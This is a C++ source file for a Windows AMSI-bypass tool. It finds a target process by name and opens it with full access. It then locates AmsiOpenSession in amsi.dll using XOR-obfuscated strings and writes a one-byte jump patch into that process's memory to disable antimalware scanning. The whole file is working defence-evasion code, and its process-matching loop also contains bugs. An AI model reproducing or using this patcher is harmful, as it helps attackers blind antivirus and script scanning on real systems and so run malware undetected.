
#include "Memory.h"
#include "Xor.h"
#include <TlHelp32.h>
#include <stdexcept>
#include <sstream>



/*Memory::Memory() {
	ourHandle = NULL;
}

Memory::~Memory() {
	CloseHandle(ourHandle);
}*/



int
Memory::SearchPattern(
    BYTE* startAddress,
    DWORD searchSize,
    BYTE* pattern,
    DWORD patternSize)
{
    DWORD i = 0;

    while (i < 1024) {

        if (startAddress[i] == pattern[0]) {
            DWORD j = 1;
            while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j])) {
                j++;
            }
            if (j == patternSize) {
                return (i + 3);
            }
        }
        i++;
    }
    return (i);
}




class WinAPIException : public std::runtime_error {
public:
    WinAPIException(const std::string& message, DWORD error_code)
        : std::runtime_error(message + " (Error Code: " + ErrorCodeToString(error_code) + ")") {}

private:
    // Convert DWORD error code to string
    std::string ErrorCodeToString(DWORD error_code) {
        std::stringstream ss;
        ss << error_code;
        return ss.str();
    }
};


// Function to open a process and load a DLL
int Memory::openProcessAndLoadLibrary(DWORD tpid, const char* dllName, const char* functionName) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);
    if (!processHandle) {
        throw WinAPIException("Error opening process", GetLastError());
    }

    HMODULE hm = LoadLibraryA(dllName);
    if (!hm) {
        CloseHandle(processHandle); // Clean up on error
        throw WinAPIException("Error loading library", GetLastError());
    }

    PVOID functionAddr = GetProcAddress(hm, functionName);
    if (!functionAddr) {
        FreeLibrary(hm); // Clean up on error
        CloseHandle(processHandle); // Clean up on error
        throw WinAPIException("Error getting function address", GetLastError());
    }

    

    //printf("\x1b[34m -> AMSI address 0x%X\x1b[0m\n", functionAddr);


    return UpdateAmsi(processHandle, functionAddr, hm);

    //return processHandle;
}


int Memory::UpdateAmsi(HANDLE processHandle, PVOID functionAddr, HMODULE hm) {
    
    // ======== Declaration des variables de travail ========
    BYTE pattern[] = { 0x48, '?' , '?', 0x74, '?', 0x48, '?', '?', 0x74 };
    

    unsigned char buff[0x400];
    DWORD patternSize = sizeof(pattern);
    char patch[] = { 0xEB };

  
    if (!ReadProcessMemory(processHandle, functionAddr, buff, sizeof(buff), nullptr)) {
        FreeLibrary(hm); // Clean up on error
        CloseHandle(processHandle); // Clean up on error
        throw WinAPIException("Error reading process memory", GetLastError());
    }


    // ======== Traitement ========
    int matchAddress = SearchPattern(buff, sizeof(buff), pattern, patternSize); // KMP algorithm
    printf("\x1b[32m===========================\x1b[0m\n");
    printf("\x1b[32m -> Pattern : 0x%02X:0x%02X:0x%02X:0x%02X:0x%02X:0x%02X:0x%02X\x1b[0m\n", pattern[0], pattern[1], pattern[2], pattern[3], pattern[4], pattern[5], pattern[6], pattern[7], pattern[8]);
    printf("\x1b[32m -> Pattern Size : %d\x1b[0m\n", patternSize);
    printf("\x1b[32m -> Patch : 0x%02X\x1b[0m\n", patch[0]);
    printf("\x1b[32m -> AMSI address : 0x%X\x1b[0m\n", functionAddr);
    printf("\x1b[32m -> Offset : %d\x1b[0m\n", matchAddress);
    printf("\x1b[32m===========================\x1b[0m\n");
    if (matchAddress == 0x400) return (0x90);

    unsigned long long int updateAmsiAdress = (unsigned long long int)functionAddr;
    updateAmsiAdress += matchAddress;
    printf("\x1b[32m -> Address To Patch : 0x%X\x1b[0m\n", updateAmsiAdress);
    // Write to process memory
    if (!WriteProcessMemory(processHandle, (PVOID)updateAmsiAdress, patch, sizeof(patch), nullptr)) {
        throw WinAPIException("Error writing to process memory", GetLastError());
    }

    return EXIT_SUCCESS;


}

int Memory::Patching(DWORD tpid)
{

    try {
        if (tpid == 0) {
            throw std::invalid_argument("Invalid process ID");
        }


        return openProcessAndLoadLibrary(tpid, XorString("amsi.dll"), XorString("AmsiOpenSession"));

    }
    catch (const WinAPIException& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return -1;
    }
    catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return -1;
    }
}



void Memory::GetProcess(const char* ourProcessName) {
	HANDLE _hProcessId = CreateToolhelp32Snapshot(0x00000002, 0);

	DWORD _process;
	PROCESSENTRY32 _pEntry;

	_pEntry.dwSize = sizeof(_pEntry);
    if (_hProcessId != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(_hProcessId, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(_hProcessId, &pE);
            do {
                if (!strcmp(_pEntry.szExeFile, ourProcessName)) 
                {
                    _process = _pEntry.th32ProcessID;
                    std::cout << "\n\x1b[34mDWORD Process : \x1b[0m" << _process << "\n\x1b[34mProcess Name : \x1b[0m" << ourProcessName << std::endl;

                    switch (Patching(_process))
                    {
                    case 0x90:
                        std::cout << "\n\x1b[31m[-] Already Done !\x1b[0m" << std::endl; break;
                    case 0x0:
                        std::cout << "\n\x1b[32m[+] Sucessfully Patched. \x1b[0m" << std::endl; break;
                    default:
                        std::cout << "\n\x1b[31m[-] Error !\x1b[0m" << std::endl;
                        break;
                    }

                }
            } while (Process32Next(_hProcessId, &_pEntry));
        }
    }

	CloseHandle(_hProcessId);
}


